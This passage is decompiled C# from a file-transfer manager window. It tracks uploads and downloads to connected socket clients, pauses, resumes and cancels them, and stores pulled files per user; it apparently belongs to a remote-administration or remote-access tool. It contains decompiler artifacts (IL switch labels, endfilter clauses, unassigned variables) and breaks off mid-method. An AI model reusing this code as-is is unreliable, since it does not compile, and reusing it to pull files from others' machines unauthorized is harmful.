	public void method_1(ref ListView listView_0, string string_0, int int_0)
	{
		ProgressBar progressBar = new ProgressBar();
		try
		{
			this.collection_0.Add(progressBar, string_0, null, null);
		}
		catch (Exception ex)
		{
		}
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate173(this.method_1), new object[]
			{
				listView_0,
				string_0,
				int_0
			});
			return;
		}
		Rectangle bounds = listView_0.Items[string_0].Bounds;
		bounds.Width = listView_0.Columns[int_0].Width;
		checked
		{
			if (int_0 > 0)
			{
				int num = int_0 - 1;
				for (int i = 0; i <= num; i++)
				{
					bounds.X += listView_0.Columns[i].Width;
				}
			}
			progressBar.Parent = listView_0;
			progressBar.SetBounds(bounds.X, bounds.Y, bounds.Width, bounds.Height);
			progressBar.Tag = string_0;
			progressBar.Maximum = 100;
			progressBar.Visible = true;
		}
	}

	// Token: 0x060017C2 RID: 6082 RVA: 0x000ADEB0 File Offset: 0x000AC0B0
	public void method_2(string string_0, string string_1, string string_2, string string_3, string string_4)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate174(this.method_2), new object[]
			{
				string_0,
				string_1,
				string_2,
				string_3,
				string_4
			});
			return;
		}
		Class130.concurrentDictionary_0[string_0].Tag = string.Concat(new string[]
		{
			string_1,
			"|",
			string_2,
			"|",
			string_3,
			"|",
			string_4
		});
	}

	// Token: 0x060017C3 RID: 6083 RVA: 0x000ADF44 File Offset: 0x000AC144
	public void method_3()
	{
		if (Class135.smethod_0().ShowGroupsTransfers)
		{
			this.vmethod_20().ShowGroups = true;
			try
			{
				if (Class135.smethod_0().GroupSortingTransfersDir)
				{
					this.vmethod_20().Sort(9);
				}
				if (Class135.smethod_0().GroupSortingTransfersUser)
				{
					this.vmethod_20().Sort(0);
				}
				this.vmethod_20().Sorting = SortOrder.None;
			}
			catch (Exception ex)
			{
			}
			Class135.smethod_0().ShowGroupsTransfers = true;
		}
		else
		{
			this.vmethod_20().ShowGroups = false;
			Class135.smethod_0().ShowGroupsTransfers = false;
		}
		Class135.smethod_0().Save();
	}

	// Token: 0x060017C4 RID: 6084 RVA: 0x000ADFF4 File Offset: 0x000AC1F4
	public void method_4()
	{
		try
		{
			if (Class135.smethod_0().ShowGroupsTransfers)
			{
				if (Operators.CompareString(this.vmethod_80().Text, "Show", true) == 0)
				{
					Class135.smethod_0().GroupSubtitlesTransfers = true;
					this.vmethod_80().Text = "Hide";
				}
				else
				{
					Class135.smethod_0().GroupSubtitlesTransfers = false;
					this.vmethod_80().Text = "Show";
				}
				try
				{
					foreach (OLVGroup olvgroup in this.vmethod_20().OLVGroups)
					{
						if (Class135.smethod_0().ShowGroupsTransfers)
						{
							if (Class130.concurrentDictionary_1.ContainsKey(olvgroup.Header))
							{
								olvgroup.Subtitle = Conversions.ToString(Operators.ConcatenateObject("Files: " + Conversions.ToString(olvgroup.VirtualItemCount) + "/", Interaction.IIf((double)olvgroup.VirtualItemCount > Conversion.Val(Class130.concurrentDictionary_1[olvgroup.Header]), olvgroup.VirtualItemCount, Class130.concurrentDictionary_1[olvgroup.Header])));
							}
							else
							{
								olvgroup.Subtitle = Conversions.ToString(olvgroup.VirtualItemCount);
							}
						}
						else
						{
							olvgroup.Subtitle = string.Empty;
						}
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				this.vmethod_20().RebuildColumns();
				Class135.smethod_0().Save();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017C5 RID: 6085 RVA: 0x000AE1A4 File Offset: 0x000AC3A4
	public void method_5(string string_0, string string_1, string string_2, string string_3, long long_0, string string_4, string string_5, string string_6)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate182(this.method_5), new object[]
			{
				string_0,
				string_1,
				string_2,
				string_3,
				long_0,
				string_4,
				string_5,
				string_6
			});
			return;
		}
		cTransfer cTransfer = new cTransfer();
		cTransfer.sKey = string_1;
		cTransfer.USER_KEY = string_2;
		cTransfer.USER = string_5;
		cTransfer.FILE = Path.GetFileName(Encoding.UTF8.GetString(Convert.FromBase64String(string_3)));
		cTransfer.SIZE = "N/A";
		cTransfer.SIZE_BYTES = long_0;
		cTransfer cTransfer2 = cTransfer;
		double num = 0.0;
		bool flag = false;
		ref bool ptr = ref flag;
		double num2 = num;
		cTransfer cTransfer3 = cTransfer2;
		int num3;
		string text2;
		int num4;
		object obj;
		try
		{
			ProjectData.ClearProjectError();
			num3 = 2;
			string text = string.Empty;
			if (num2 >= 1099511627776.0)
			{
				text = Strings.Format(num2 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
			}
			else if (num2 >= 1073741824.0)
			{
				text = Strings.Format(num2 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
			}
			else if (num2 >= 1048576.0)
			{
				text = Strings.Format(num2 / 1024.0 / 1024.0, "#0.00") + " MiB";
			}
			else if (num2 >= 1024.0)
			{
				text = Strings.Format(num2 / 1024.0, "#0.00") + " KiB";
			}
			else if (num2 < 1024.0)
			{
				text = Conversions.ToString(Conversion.Fix(num2)) + " B";
			}
			if (ptr)
			{
				text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
			}
			if (text.Length > 0)
			{
				text2 = text;
			}
			else
			{
				text2 = " 0 B";
			}
			IL_224:
			goto IL_274;
			IL_226:
			text2 = "0 B";
			goto IL_224;
			IL_22F:
			num4 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_245:;
		}
		catch when (endfilter(obj is Exception & num3 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_22F;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_274:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		string progress = text2;
		cTransfer3.PROGRESS = progress;
		cTransfer.SPEED = "N/A";
		cTransfer.STATUS = "Pending";
		cTransfer.ELAPSED = "0s";
		cTransfer.ETA = "N/A";
		cTransfer.DIRECTION = "Download";
		cTransfer.GROUP_ID = string_6;
		cTransfer.Tag = string.Concat(new string[]
		{
			string_1,
			"|",
			string_2,
			"|",
			string_4,
			"|",
			string_3
		});
		cTransfer.TRANSFER_ACTIVE = true;
		cTransfer.bJustConnected = true;
		Class130.concurrentDictionary_0.TryAdd(string_0, cTransfer);
		Class130.concurrentDictionary_0[string_0].Key = string_0;
		this.concurrentStack_0.Push(cTransfer);
	}

	// Token: 0x060017C6 RID: 6086 RVA: 0x000AE50C File Offset: 0x000AC70C
	public void method_6()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate167(this.method_6), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_20().AddObjects(this.concurrentStack_0.ToList<cTransfer>());
			this.concurrentStack_0.Clear();
			this.vmethod_40().Text = "Files: " + Conversions.ToString(Class130.concurrentDictionary_0.Count);
			if (!this.bool_0)
			{
				this.method_3();
				this.bool_0 = true;
			}
		}
	}

	// Token: 0x060017C7 RID: 6087 RVA: 0x000AE5B0 File Offset: 0x000AC7B0
	public void method_7()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate169(this.method_7), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_20().RefreshObjects(this.concurrentStack_1.ToList<cTransfer>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x060017C8 RID: 6088 RVA: 0x000AE618 File Offset: 0x000AC818
	public void method_8()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate177(this.method_8), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_20().RemoveObjects(this.concurrentStack_2.ToList<cTransfer>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x060017C9 RID: 6089 RVA: 0x000AE680 File Offset: 0x000AC880
	public void method_9()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate178(this.method_9), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_20().AddObjects(this.concurrentStack_0.ToList<cTransfer>());
			this.concurrentStack_0.Clear();
			this.vmethod_40().Text = "Files: " + Conversions.ToString(this.vmethod_20().Items.Count);
			if (!this.bool_0)
			{
				this.method_3();
				this.bool_0 = true;
			}
		}
	}

	// Token: 0x060017CA RID: 6090 RVA: 0x000AE728 File Offset: 0x000AC928
	public void method_10()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate168(this.method_10), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_20().RefreshObjects(this.concurrentStack_1.ToList<cTransfer>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x060017CB RID: 6091 RVA: 0x000AE790 File Offset: 0x000AC990
	public void method_11()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate177(this.method_11), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_20().RemoveObjects(this.concurrentStack_2.ToList<cTransfer>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x060017CC RID: 6092 RVA: 0x000AE7F8 File Offset: 0x000AC9F8
	public void method_12(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate170(this.method_12), new object[]
			{
				string_0,
				string_1,
				string_2,
				string_3,
				string_4,
				string_5
			});
			return;
		}
		cTransfer cTransfer = new cTransfer();
		cTransfer.sKey = string_1;
		cTransfer.USER = string_4;
		cTransfer.USER_KEY = string_2;
		cTransfer.FILE = Path.GetFileName(string_3);
		cTransfer.SIZE = "N/A";
		cTransfer.SIZE_BYTES = Class136.smethod_32(ref string_3);
		cTransfer.PROGRESS = string.Empty;
		cTransfer.SPEED = "N/A";
		cTransfer.STATUS = "Pending";
		cTransfer.ELAPSED = "0s";
		cTransfer.ETA = "N/A";
		cTransfer.DIRECTION = "Upload";
		cTransfer.Tag = string.Concat(new string[]
		{
			string_1,
			"|",
			string_2,
			"||",
			string_3
		});
		cTransfer.TRANSFER_ACTIVE = true;
		cTransfer.GROUP_ID = string_5;
		cTransfer.bJustConnected = true;
		Class130.concurrentDictionary_0.TryAdd(string_0, cTransfer);
		Class130.concurrentDictionary_0[string_0].Key = string_0;
		this.concurrentStack_0.Push(cTransfer);
		this.vmethod_40().Text = "Files: " + Conversions.ToString(this.vmethod_20().Items.Count);
	}

	// Token: 0x060017CD RID: 6093 RVA: 0x000AE968 File Offset: 0x000ACB68
	public void method_13()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate172(this.method_13), new object[0]);
			return;
		}
		int count = this.collection_0.Count;
		checked
		{
			for (int i = 1; i <= count; i++)
			{
				ProgressBar progressBar = (ProgressBar)this.collection_0[i];
				ProgressBar progressBar2;
				object[] array;
				bool[] array2;
				object instance = NewLateBinding.LateGet(this.vmethod_20().Items, null, "Item", array = new object[]
				{
					(progressBar2 = progressBar).Tag
				}, null, null, array2 = new bool[]
				{
					true
				});
				if (array2[0])
				{
					progressBar2.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
				}
				object obj = NewLateBinding.LateGet(instance, null, "Bounds", new object[0], null, null, null);
				Rectangle rectangle = (obj != null) ? ((Rectangle)obj) : default(Rectangle);
				rectangle.Width = this.vmethod_20().Columns[8].Width;
				int num = 0;
				do
				{
					rectangle.X += this.vmethod_20().Columns[num].Width;
					num++;
				}
				while (num <= 7);
				progressBar.SetBounds(rectangle.X, rectangle.Y, rectangle.Width, rectangle.Height);
			}
		}
	}

	// Token: 0x060017CE RID: 6094 RVA: 0x000AEAC0 File Offset: 0x000ACCC0
	public void method_14(string string_0)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate171(this.method_14), new object[]
			{
				string_0
			});
			return;
		}
		new ProgressBar();
		((ProgressBar)this.collection_0[string_0]).Dispose();
		this.collection_0.Remove(string_0);
	}

	// Token: 0x060017CF RID: 6095 RVA: 0x000AEB28 File Offset: 0x000ACD28
	public void method_15(string string_0, int int_0)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate179(this.method_15), new object[]
			{
				string_0,
				int_0
			});
			return;
		}
		ProgressBar progressBar = new ProgressBar();
		progressBar = (ProgressBar)this.collection_0[string_0];
		if (int_0 <= progressBar.Maximum)
		{
			progressBar.Value = int_0;
			return;
		}
		progressBar.Value = progressBar.Maximum;
	}

	// Token: 0x060017D0 RID: 6096 RVA: 0x000AEBA4 File Offset: 0x000ACDA4
	public void method_16(string string_0, int int_0, string string_1)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate176(this.method_16), new object[]
			{
				string_0,
				int_0,
				string_1
			});
			return;
		}
		try
		{
			Class130.concurrentDictionary_0[string_0].idxValues[int_0] = string_1;
			Class130.concurrentDictionary_0[string_0].bJustConnected = false;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017D1 RID: 6097 RVA: 0x000AEC34 File Offset: 0x000ACE34
	public void method_17(string string_0)
	{
		try
		{
			this.concurrentStack_1.Push(Class130.concurrentDictionary_0[string_0]);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060017D2 RID: 6098 RVA: 0x0000C384 File Offset: 0x0000A584
	private void method_18(object sender, EventArgs e)
	{
		new Thread(new ThreadStart(this.method_19)).Start();
	}

	// Token: 0x060017D3 RID: 6099 RVA: 0x000AEC78 File Offset: 0x000ACE78
	private void method_19()
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fTransferManager.Delegate181(this.method_19), new object[0]);
			return;
		}
		FastObjectListView fastObjectListView = this.vmethod_20();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				cTransfer cTransfer = (cTransfer)obj;
				if (Operators.CompareString(cTransfer.STATUS, "Completed", true) == 0 | Operators.CompareString(cTransfer.STATUS, "Cancelled", true) == 0 | Operators.CompareString(Strings.Mid(cTransfer.STATUS, 1, 6), "Failed", true) == 0 | Operators.CompareString(Strings.Mid(cTransfer.STATUS, 1, 7), "Ignored", true) == 0)
				{
					ConcurrentDictionary<string, cTransfer> concurrentDictionary_ = Class130.concurrentDictionary_0;
					string key = cTransfer.Key;
					cTransfer cTransfer2 = null;
					concurrentDictionary_.TryRemove(key, out cTransfer2);
					this.concurrentStack_2.Push(cTransfer);
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x060017D4 RID: 6100 RVA: 0x000AED8C File Offset: 0x000ACF8C
	private void method_20(object sender, EventArgs e)
	{
		checked
		{
			if (MessageBox.Show("Cancel selected transfers?", Application.ProductName, MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				FastObjectListView fastObjectListView = this.vmethod_20();
				if (fastObjectListView.SelectedObjects != null)
				{
					try
					{
						foreach (cTransfer cTransfer in fastObjectListView.SelectedObjects)
						{
							if ((Operators.CompareString(cTransfer.STATUS, "Download", true) != 0 | Operators.CompareString(cTransfer.STATUS, "Uploading", true) != 0) && Class130.concurrentDictionary_3.ContainsKey(Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[0]))
							{
								CClient cclient = Class130.concurrentDictionary_3[Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[0]];
								bool flag = true;
								CClient cclient2 = cclient;
								bool flag2;
								byte[] byte_;
								string string_;
								Class136.Class142 @class;
								if (File.Exists(string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								})))
								{
									string text = string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									});
									byte[] array = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
									flag2 = true;
									byte_ = array;
									string_ = text;
									@class = new Class136.Class142();
									@class.string_0 = string_;
									@class.byte_0 = byte_;
									@class.bool_0 = true;
									try
									{
										if (flag2)
										{
											new Thread(new ThreadStart(@class._Lambda$__0)).Start();
										}
										else
										{
											Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
										}
										goto IL_363;
									}
									catch (Exception ex)
									{
										goto IL_363;
									}
									goto IL_1B2;
								}
								goto IL_1B2;
								IL_304:
								Class130.long_3 -= 1L;
								if (Class130.long_3 < 0L)
								{
									Class130.long_3 = 0L;
								}
								Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
								Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
								continue;
								IL_363:
								cclient2.FILE_TRANSFER_DL_DATA.SetLength(0L);
								cclient2.FILE_TRANSFER_ACTIVE = false;
								if (!flag)
								{
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, Conversions.ToString(Interaction.IIf(Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].SIZE_BYTES > 0L, "Failed", "Completed")));
									Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									goto IL_304;
								}
								IL_26A:
								Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Cancelled");
								Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
								CClient cclient3 = cclient2;
								bool flag3 = true;
								cclient3.SOCKET_DISCONNECT(ref flag3);
								goto IL_304;
								IL_1B2:
								string text2 = string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								});
								byte[] array2 = cclient2.FILE_TRANSFER_DL_DATA.ToArray();
								flag2 = true;
								byte_ = array2;
								string_ = text2;
								@class = new Class136.Class142();
								@class.string_0 = string_;
								@class.byte_0 = byte_;
								@class.bool_0 = false;
								try
								{
									if (flag2)
									{
										new Thread(new ThreadStart(@class._Lambda$__0)).Start();
									}
									else
									{
										Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
									}
									goto IL_363;
								}
								catch (Exception ex2)
								{
									goto IL_363;
								}
								goto IL_26A;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				fastObjectListView.Refresh();
				fastObjectListView = null;
			}
		}
	}

	// Token: 0x060017D5 RID: 6101 RVA: 0x000AF190 File Offset: 0x000AD390
	private void method_21(object sender, EventArgs e)
	{
		int num;
		int num2;
		object obj2;
		try
		{
			ProjectData.ClearProjectError();
			num = 2;
			FastObjectListView fastObjectListView = this.vmethod_20();
			if (fastObjectListView.SelectedObjects != null)
			{
				IEnumerator enumerator = fastObjectListView.SelectedObjects.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					cTransfer cTransfer = (cTransfer)obj;
					if (Directory.Exists(Path.GetDirectoryName(Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[2])))
					{
						Process.Start(Path.GetDirectoryName(Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[2]));
						goto IL_93;
					}
				}
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IL_93:
			goto IL_D6;
			IL_95:
			num2 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_A9:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num2 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_95;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_D6:
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x060017D6 RID: 6102 RVA: 0x000AF28C File Offset: 0x000AD48C
	private void method_22(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects != null)
		{
			try
			{
				foreach (cTransfer cTransfer in fastObjectListView.SelectedObjects)
				{
					if (Operators.CompareString(cTransfer.STATUS, "Downloading", true) == 0 | Operators.CompareString(cTransfer.STATUS, "Uploading", true) == 0)
					{
						CClient cclient = Class130.concurrentDictionary_3[Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[0]];
						cclient.FILE_TRANSFER_PAUSED_TIMESTAMP = (double)Class136.smethod_36();
						cclient.FILE_TRANSFER_ISPAUSED = true;
						CClient cclient2 = cclient;
						bool flag = false;
						cclient2.SOCKET_DISCONNECT(ref flag);
						Class130.fTransferManager_0.method_16(cclient.FILE_TRANSFER_ID, 5, "Paused");
						Class130.fTransferManager_0.method_16(cclient.FILE_TRANSFER_ID, 7, "N/A");
						Class130.fTransferManager_0.method_17(cclient.FILE_TRANSFER_ID);
						bool flag2;
						byte[] byte_;
						string string_;
						Class136.Class142 @class;
						if (File.Exists(string.Concat(new string[]
						{
							Application.StartupPath,
							"\\Downloads\\",
							cclient.FILE_TRANSFER_USER,
							"\\",
							cclient.FILE_TRANSFER_FILENAME
						})))
						{
							string text = string.Concat(new string[]
							{
								Application.StartupPath,
								"\\Downloads\\",
								cclient.FILE_TRANSFER_USER,
								"\\",
								cclient.FILE_TRANSFER_FILENAME
							});
							byte[] array = cclient.FILE_TRANSFER_DL_DATA.ToArray();
							flag2 = true;
							byte_ = array;
							string_ = text;
							@class = new Class136.Class142();
							@class.string_0 = string_;
							@class.byte_0 = byte_;
							@class.bool_0 = true;
							try
							{
								if (flag2)
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
								else
								{
									Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
								}
								goto IL_28B;
							}
							catch (Exception ex)
							{
								goto IL_28B;
							}
							goto IL_1D9;
						}
						goto IL_1D9;
						IL_28B:
						cclient.FILE_TRANSFER_DL_DATA.SetLength(0L);
						continue;
						IL_1D9:
						string text2 = string.Concat(new string[]
						{
							Application.StartupPath,
							"\\Downloads\\",
							cclient.FILE_TRANSFER_USER,
							"\\",
							cclient.FILE_TRANSFER_FILENAME
						});
						byte[] array2 = cclient.FILE_TRANSFER_DL_DATA.ToArray();
						flag2 = true;
						byte_ = array2;
						string_ = text2;
						@class = new Class136.Class142();
						@class.string_0 = string_;
						@class.byte_0 = byte_;
						@class.bool_0 = false;
						try
						{
							if (flag2)
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
							else
							{
								Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
							}
						}
						catch (Exception ex2)
						{
						}
						goto IL_28B;
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060017D7 RID: 6103 RVA: 0x000AF5A4 File Offset: 0x000AD7A4
	private void method_23(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = this.vmethod_20();
		if (fastObjectListView.SelectedObjects != null)
		{
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					cTransfer cTransfer = (cTransfer)obj;
					if (Operators.CompareString(cTransfer.STATUS, "Paused", true) == 0)
					{
						string text = Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[0];
						string text2 = Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[1];
						string fileName = Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[2];
						string text3 = Strings.Split(cTransfer.Tag, "|", -1, CompareMethod.Text)[3];
						long length = new FileInfo(fileName).Length;
						CClient cclient = Class130.concurrentDictionary_3[text];
						Class130.fTransferManager_0.method_16(cclient.FILE_TRANSFER_ID, 5, "Pending");
						Class130.fTransferManager_0.method_16(cclient.FILE_TRANSFER_ID, 7, "N/A");
						Class130.fTransferManager_0.method_17(cclient.FILE_TRANSFER_ID);
						cclient.FILE_TRANSFER_ISPAUSED = false;
						string string_ = string.Concat(new string[]
						{
							"files_download_resume|",
							text,
							"|",
							text3,
							"|",
							Conversions.ToString(length)
						});
						string string_2 = text2;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x060017D8 RID: 6104 RVA: 0x000AF7A0 File Offset: 0x000AD9A0
	private void method_24(object sender, MouseEventArgs e)
	{
		if (this.vmethod_20().SelectedObjects.Count > 0)
		{
			cTransfer cTransfer = (cTransfer)this.vmethod_20().SelectedObjects[0];
			this.vmethod_6().Enabled = Conversions.ToBoolean(Interaction.IIf(cTransfer.TRANSFER_ACTIVE, true, false));
			this.vmethod_14().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(cTransfer.DIRECTION, "Download", true) == 0 & cTransfer.TRANSFER_ACTIVE & Operators.CompareString(cTransfer.STATUS, "Paused", true) != 0, true, false));
			this.vmethod_16().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(cTransfer.STATUS, "Paused", true) == 0 & cTransfer.TRANSFER_ACTIVE & Operators.CompareString(cTransfer.DIRECTION, "Download", true) == 0, true, false));
			this.vmethod_8().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(cTransfer.DIRECTION, "Download", true) == 0, true, false));
		}
		else
		{
			this.vmethod_6().Enabled = false;
			this.vmethod_8().Enabled = false;
			this.vmethod_16().Enabled = false;
			this.vmethod_14().Enabled = false;
		}
		this.vmethod_72().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().Items.Count == 0, false, true));
		this.vmethod_78().Enabled = Class135.smethod_0().ShowGroupsTransfers;
		this.vmethod_82().Enabled = Class135.smethod_0().ShowGroupsTransfers;
		this.vmethod_84().Enabled = Class135.smethod_0().ShowGroupsTransfers;
		this.vmethod_76().Text = Conversions.ToString(Interaction.IIf(Class135.smethod_0().ShowGroupsTransfers, "Hide", "Show"));
		this.vmethod_80().Text = Conversions.ToString(Interaction.IIf(Class135.smethod_0().GroupSubtitlesTransfers, "Hide", "Show"));
		this.vmethod_86().Checked = Conversions.ToBoolean(Interaction.IIf(Class135.smethod_0().GroupSortingTransfersDir, true, false));
		this.vmethod_90().Checked = Conversions.ToBoolean(Interaction.IIf(Class135.smethod_0().GroupSortingTransfersUser, true, false));
		this.vmethod_2().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_20().Items.Count > 0, true, false));
	}

	// Token: 0x060017D9 RID: 6105 RVA: 0x0000C39C File Offset: 0x0000A59C
	private void method_25(object sender, EventArgs e)
	{
		this.method_26();
	}

	// Token: 0x060017DA RID: 6106 RVA: 0x000AFA5C File Offset: 0x000ADC5C
	public void method_26()
	{
		try
		{
			if (this.vmethod_20().InvokeRequired)
			{
				this.vmethod_20().Invoke(new fTransferManager.Delegate180(this.method_26), new object[0]);
			}
			else
			{
				this.vmethod_40().Text = "Files: " + Conversions.ToString(this.vmethod_20().Items.Count);
				bool flag;
				bool ptr;
				double num4;
				int num6;
				string text2;
				int num7;
				if (this.vmethod_20().SelectedObjects.Count > 0)
				{
					double num;
					try
					{
						foreach (object obj in this.vmethod_20().SelectedObjects)
						{
							cTransfer cTransfer = (cTransfer)obj;
							num += (double)cTransfer.SIZE_BYTES;
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					ToolStripStatusLabel toolStripStatusLabel = this.vmethod_54();
					string[] array = new string[5];
					array[0] = "Selected: ";
					array[1] = Conversions.ToString(this.vmethod_20().SelectedObjects.Count);
					array[2] = " (";
					int num2 = 3;
					double num3 = num;
					flag = false;
					ptr = ref flag;
					num4 = num3;
					int num5 = num2;
					string[] array2 = array;
					string[] array3 = array;
					ToolStripStatusLabel toolStripStatusLabel2 = toolStripStatusLabel;
					object obj2;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
